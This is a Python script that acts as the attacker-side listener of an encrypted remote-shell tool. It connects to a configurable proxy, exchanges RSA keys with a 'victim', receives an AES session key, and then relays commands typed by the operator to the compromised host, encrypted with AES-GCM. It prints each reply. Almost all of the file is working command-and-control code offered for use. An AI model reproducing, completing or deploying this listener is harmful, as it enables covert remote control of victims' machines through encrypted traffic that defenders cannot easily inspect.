import asyncio
import base64
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
import json


# Encryption process.
def encrypt(data, aes_key):
    cipher = AES.new(aes_key, AES.MODE_GCM)
    cipher_text, tag = cipher.encrypt_and_digest(data)
    nonce = cipher.nonce
    return base64.b64encode(nonce + tag + cipher_text)  # type: ignore


# Decryption process.
def decrypt(data, aes_key):
    data = base64.b64decode(data)
    nonce, tag, cipher_text = data[:16], data[16:32], data[32:]
    cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(cipher_text, tag).decode()


# Listener handle.
async def listener():

    global aes_key

    try:
        while True:

            # Create reader and writer handlers for tcp socket.
            # Add your proxy IP.
            reader, writer = await asyncio.open_connection('127.0.0.1', 5555)

            # Generate RSA key pair.
            key = RSA.generate(2048)
            private_key = key
            public_key = key.public_key()
            print('\n[+] RSA key pair generated.')

            # Send listener public key.
            writer.write(json.dumps({
                'pubkey': base64.b64encode(public_key.export_key()).decode()
            }).encode())
            await writer.drain()
            print('[+] Sent listener public key.')

            # Receive victim's public key.
            data = await reader.read(10000)
            msg = json.loads(data.decode())

            if 'pubkey' in msg:

                victim_pubkey = RSA.import_key(base64.b64decode(msg['pubkey']))
                print('[+] Received victim public key.')

            # Receive AES key.
            data = await reader.read(10000)
            msg = json.loads(data.decode())

            # Decrypt encrypted AES key and store it.
            if 'AES-key' in msg:

                encrypted_aes_key = base64.b64decode(msg['AES-key'])
                cipher_rsa = PKCS1_OAEP.new(private_key)
                aes_key = cipher_rsa.decrypt(encrypted_aes_key)
                print('[+] Received AES key.')

                print('[+] Victim successfully connected.\n')

            # Command send and recieve section.
            while True:

                command = input('>> ')

                if command.strip() == 'exit':

                    writer.write(encrypt(command.encode(), aes_key))

                    writer.close()
                    await writer.wait_closed()
                    exit()

                writer.write(encrypt(command.encode(), aes_key))
                await writer.drain()

                response = await reader.read(10000)
                print(decrypt(response, aes_key))

    except Exception as e:

        print(f'[!] Error: {e}')

asyncio.run(listener())
